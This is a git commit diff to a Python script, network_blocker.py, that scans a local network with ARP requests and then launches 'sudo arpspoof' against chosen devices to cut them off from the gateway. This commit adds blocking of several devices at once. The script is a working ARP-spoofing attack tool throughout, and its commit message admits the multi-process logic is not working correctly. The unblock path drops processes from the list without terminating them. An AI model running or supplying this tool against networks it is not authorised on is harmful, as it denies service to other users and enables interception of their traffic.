ba67ffd8664da36fecce55385f7e6bc48b393f8d
Facundo Venturi <81877086+fakuventuri@users.noreply.github.com>
2023-04-24 06:01:12 -0300

    Implement multiple process, not working correctly
    Implement multiple process, not working correctly

--- network_blocker.py
+++ network_blocker.py
@@ -12,10 +12,11 @@
 #
 import os
 import sys
+import socket
+import subprocess
 
 from typing import List, Tuple
 
-import socket
 
 try:
     from scapy.all import ARP, Ether, srp
@@ -27,7 +28,7 @@ except ImportError:
     sys.exit(1)
 
 
-def scan_network(ip_range: str) -> List[Tuple[str, str]]:
+def scan_network(ip_range: str) -> List[Tuple[str, str, str]]:
     arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
     answered, _ = srp(arp_req, timeout=3, verbose=False)
 
@@ -36,6 +37,7 @@ def scan_network(ip_range: str) -> List[Tuple[str, str]]:
     for _, rcv in answered:
         ip = rcv[ARP].psrc
         mac = rcv[Ether].src
+
         try:
             hostname = socket.gethostbyaddr(ip)[0]
         except socket.herror:
@@ -45,7 +47,7 @@ def scan_network(ip_range: str) -> List[Tuple[str, str]]:
     return device_list
 
 
-def generate_devices_table(device_list: List[Tuple[str, str]]):
+def generate_devices_table(device_list: List[Tuple[str, str, str]]):
     headers = ["Index", "IP Address", "MAC Address", "Hostname"]
     table = [
         (index, ip, mac, hostname)
@@ -59,12 +61,13 @@ def block_device(
     device: Tuple[str, str, str],
     gateway_ip: str,
     iface: str,
-):
+) -> subprocess.Popen:
     target_ip, target_mac, hostname = device
 
     # send the arp spoofing packets
-    arpspoof_cmd = f"sudo arpspoof -i {iface} -t {target_ip} {gateway_ip}"
-    os.system(arpspoof_cmd)
+    arpspoof_cmd = ["sudo", "arpspoof", "-i", iface, "-t", target_ip, gateway_ip]
+    process = subprocess.Popen(arpspoof_cmd)
+    return process
 
 
 def print_menu():
@@ -84,11 +87,11 @@ if __name__ == "__main__":
 
     print("Scanning network...")
 
+    ip_range = "192.168.1.0/24"  # the ip range to scan
+
     iface = (
         os.popen("ip -o -4 route show to default | awk '{print $5}'").read().strip("\n")
     )  # get the interface name and remove the trailing newline
-
-    ip_range = "192.168.1.0/24"  # the ip range to scan
 
     gateway_ip = (
         os.popen("ip -o -4 route show to default | awk '{print $3}'").read().strip("\n")
@@ -103,6 +106,8 @@ if __name__ == "__main__":
     # scan the network and get the list of devices
     device_list = scan_network(ip_range)
 
+    blocked_devices = []
+
     if not device_list:
         print("No devices found.")
         sys.exit(1)
@@ -116,55 +121,79 @@ if __name__ == "__main__":
 
     print("           Your IP Address is: ", IPAddr, "\n\n\n")
 
-    # loop to get the user's choice
-    while True:
-        try:
-            # get the user's choice
-            choice = int(input("Enter the index of the device or -1 to exit: "))
+    try:
+        while True:
+            try:
+                # get the user's choice
+                choice = int(
+                    input(
+                        "Enter the index of the device to block/unblock, -2 to unblock all, or -1 to exit: "
+                    )
+                )
 
-            if choice == -1:
-                print("\nExiting...")
-                break
-            elif 0 <= choice < len(device_list):
-                # check if the user selected the gateway and prevent it
-                if device_list[choice][0] == gateway_ip:
+                if choice == -1:
+                    break
+                elif choice == -2:
+                    print("Unblocking all devices...")
+                    for process in blocked_devices:
+                        process.terminate()
+                        process.wait()
+                    blocked_devices.clear()
+                elif 0 <= choice < len(device_list):
+                    # check if the user selected the gateway and prevent it
+                    if device_list[choice][0] == gateway_ip:
+                        print_menu()
+
+                        print(devices_table, "\n")
+
+                        print("           Your IP Address is: ", IPAddr, "\n")
+
+                        print("             You cannot block your gateway.\n")
+                        continue
+
+                    print("\nselected device: ", choice)
+                    selected_device = device_list[choice]
+
+                    if any(
+                        process.args[-2] == selected_device[0]
+                        for process in blocked_devices
+                    ):
+                        print("Unblocking", selected_device[0])
+                        blocked_devices = [
+                            process
+                            for process in blocked_devices
+                            if process.args[-2] != selected_device[0]
+                        ]
+                    else:
+                        print("Blocking", selected_device[0])
+
+                        process = block_device(selected_device, gateway_ip, iface)
+
+                        blocked_devices.append(process)
+
+                    print_menu()
+
+                    print(devices_table, "\n")
+
+                    print("           Your IP Address is: ", IPAddr, "\n")
+                else:
                     print_menu()
 
                     print(devices_table, "\n")
 
                     print("           Your IP Address is: ", IPAddr, "\n")
 
-                    print("             You cannot block your gateway.\n")
-                    continue
-
-                print("\nselected device: ", choice)
-                selected_device = device_list[choice]
-                print(
-                    "Blocking",
-                    selected_device[0],
-                )
-                print("Press Ctrl+C and wait to stop blocking the device.\n")
-
-                block_device(selected_device, gateway_ip, iface)
-
-                print_menu()
-
-                print(devices_table, "\n")
-
-                print("           Your IP Address is: ", IPAddr, "\n")
-            else:
+                    print("           Invalid choice. Please try again.\n")
+            except ValueError:
                 print_menu()
 
                 print(devices_table, "\n")
 
                 print("           Your IP Address is: ", IPAddr, "\n")
 
-                print("           Invalid choice. Please try again.\n")
-        except ValueError:
-            print_menu()
-
-            print(devices_table, "\n")
-
-            print("           Your IP Address is: ", IPAddr, "\n")
-
-            print("          Invalid input. Please enter a number.    \n")
+                print("          Invalid input. Please enter a number.    \n")
+    finally:
+        print("Terminating all processes...")
+        for process in blocked_devices:
+            process.terminate()
+            process.wait()
